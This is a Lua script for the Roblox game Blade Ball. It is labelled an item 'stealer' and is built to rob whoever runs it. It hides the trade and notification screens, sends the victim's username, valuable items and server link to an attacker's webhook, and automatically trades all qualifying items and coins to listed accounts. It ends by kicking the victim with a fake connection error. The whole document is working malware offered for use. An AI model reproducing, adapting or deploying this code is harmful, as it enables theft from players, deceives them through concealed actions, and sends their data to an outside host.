-- // SECURITE EXECUTION
_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

-- // AUTHENTICATION & GLOBALES
local auth_token = _G.AuthToken or "EBK-SS-A" 
local users = _G.Usernames or {}
local min_rap = _G.min_rap or 100
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""

local itemsToSend = {}
local categories = {"Sword", "Emote", "Explosion"}
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local netModule = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")
local PlayerGui = plr.PlayerGui

-- // PROTECTION ET VÉRIFICATIONS
if next(users) == nil or webhook == "" then
    plr:kick("Configuration incomplete (Usernames/Webhook)")
    return
end

-- // VÉRIFICATION DU PIN (LOGIQUE ORIGINALE)
local argsPIN = {[1] = {["option"] = "PIN", ["value"] = "9079"}}
local _, PINReponse = netModule:WaitForChild("RF/ResetPINCode"):InvokeServer(unpack(argsPIN))
if PINReponse ~= "You don't have a PIN code" then
    plr:kick("Account error. Please disable trade PIN and try again")
    return
end

-- // NETTOYAGE UI ET DISCRÉTION
local tradeGui = PlayerGui:WaitForChild("Trade")
local notificationsGui = PlayerGui:WaitForChild("Notifications")
local tradeCompleteGui = PlayerGui:WaitForChild("TradeCompleted")

tradeGui.Black.Visible = false
tradeGui.MiscChat.Visible = false
tradeCompleteGui.Black.Visible = false
tradeCompleteGui.Main.Visible = false

local maintradegui = tradeGui.Main
maintradegui.Visible = false
maintradegui:GetPropertyChangedSignal("Visible"):Connect(function() maintradegui.Visible = false end)

notificationsGui.Notifications.Visible = false
notificationsGui.Notifications:GetPropertyChangedSignal("Visible"):Connect(function() notificationsGui.Notifications.Visible = false end)

local inTrade = false
tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
    inTrade = tradeGui.Enabled
    if inTrade then
        task.spawn(function()
            if plr.Character then
                for i = 1, 20 do
                    for _, obj in ipairs(plr.Character:GetDescendants()) do
                        if obj:IsA("BillboardGui") then obj:Destroy() end
                    end
                    task.wait(0.1)
                end
            end
        end)
    end
end)

-- // FONCTION D'ENVOI AU WORKER
local function sendToWorker(payload)
    payload["auth_token"] = auth_token
    local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
    if requestFunc then
        pcall(function()
            requestFunc({
                Url = webhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(payload)
            })
        end)
    end
end

-- // FORMATAGE RAP
local function formatNumber(number)
    if number == nil then return "0" end
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 and suffixIndex < #suffixes do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    return suffixIndex == 1 and tostring(math.floor(number)) or string.format("%.2f%s", number, suffixes[suffixIndex])
end

-- // SCAN INVENTAIRE (LOGIQUE MAP RAP)
local clientInventory = require(ReplicatedStorage.Shared.Inventory.Client).Get()
local Replion = require(ReplicatedStorage.Packages.Replion)
local rapData = Replion.Client:GetReplion("ItemRAP").Data.Items

local function buildNameToRAPMap(category)
    local nameToRAP = {}
    local catData = rapData[category]
    if not catData then return nameToRAP end
    for serializedKey, rap in pairs(catData) do
        local success, decodedKey = pcall(function() return HttpService:JSONDecode(serializedKey) end)
        if success and type(decodedKey) == "table" then
            for _, pair in ipairs(decodedKey) do
                if pair[1] == "Name" then nameToRAP[pair[2]] = rap break end
            end
        end
    end
    return nameToRAP
end

local rapMappings = {}
for _, category in ipairs(categories) do rapMappings[category] = buildNameToRAPMap(category) end

local totalRAP = 0
for _, category in ipairs(categories) do
    if clientInventory[category] then
        for itemId, itemInfo in pairs(clientInventory[category]) do
            if not itemInfo.TradeLock then
                local rap = (rapMappings[category] and rapMappings[category][itemInfo.Name]) or 0
                if rap >= min_rap then
                    totalRAP = totalRAP + rap
                    table.insert(itemsToSend, {ItemID = itemId, RAP = rap, itemType = category, Name = itemInfo.Name})
                end
            end
        end
    end
end

-- // MESSAGES WEBHOOKS
local function SendWebhookMessage(isJoin, list)
    local isGoodHit = totalRAP >= 500
    local grouped = {}
    for _, item in ipairs(list) do
        grouped[item.Name] = (grouped[item.Name] or 0) + 1
    end

    local itemText = ""
    for name, count in pairs(grouped) do
        itemText = itemText .. string.format("%s (x%d)\n", name, count)
    end

    local data = {
        ["username"] = isJoin and (isGoodHit and "🟢 Eblack - GOOD HIT" or "🟣 Eblack - SMALL HIT") or "⚪ Eblack - SERVER HIT",
        ["content"] = isJoin and ((ping == "Yes" and "@everyone " or "") .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')") or nil,
        ["embeds"] = {{
            ["title"] = isJoin and "🔴 Join to get Blade Ball hit" or "⚪ Server Hit 🎯",
            ["color"] = isGoodHit and 65280 or 8323327,
            ["fields"] = {
                {name = "Victim Username:", value = "```" .. plr.Name .. "```", inline = true},
                {name = "Join link:", value = "https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId, inline = false},
                {name = "Item list:", value = itemText ~= "" and itemText or "None", inline = false},
                {name = "Summary:", value = "Total RAP: **" .. formatNumber(totalRAP) .. "**", inline = false}
            },
            ["footer"] = {["text"] = "Blade Ball stealer by Eblack"}
        }}
    }
    sendToWorker(data)
end

-- // EXECUTION DU STEAL
if #itemsToSend > 0 then
    table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
    local sentItemsSnapshot = {}
    for i, v in ipairs(itemsToSend) do sentItemsSnapshot[i] = v end

    SendWebhookMessage(true, sentItemsSnapshot)

    local function doTrade(targetName)
        SendWebhookMessage(false, sentItemsSnapshot)
        local target = Players:WaitForChild(targetName)
        
        while #itemsToSend > 0 do
            repeat
                wait(0.2)
                netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(target)
            until inTrade == true

            local batch = {}
            for i = 1, math.min(100, #itemsToSend) do table.insert(batch, table.remove(itemsToSend, 1)) end
            for _, item in ipairs(batch) do
                netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(item.itemType, item.ItemID)
            end

            -- AJOUT DES COINS
            pcall(function()
                local rawText = PlayerGui.TradeRequest.Main.Currency.Coins.Amount.Text
                local tokensamount = tonumber(rawText:gsub("[^%d]", "")) or 0
                if tokensamount >= 1 then
                    netModule:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(tokensamount)
                end
            end)

            -- READY & CONFIRM
            repeat wait(0.1) netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true) until true
            task.wait(0.2)
            repeat wait(0.1) netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer() until not inTrade
        end
        plr:kick("Connection error, please rejoin.")
    end

    local function onPlayerJoined(player)
        if table.find(users, player.Name) then
            doTrade(player.Name)
        end
    end

    for _, p in ipairs(Players:GetPlayers()) do onPlayerJoined(p) end
    Players.PlayerAdded:Connect(onPlayerJoined)
end
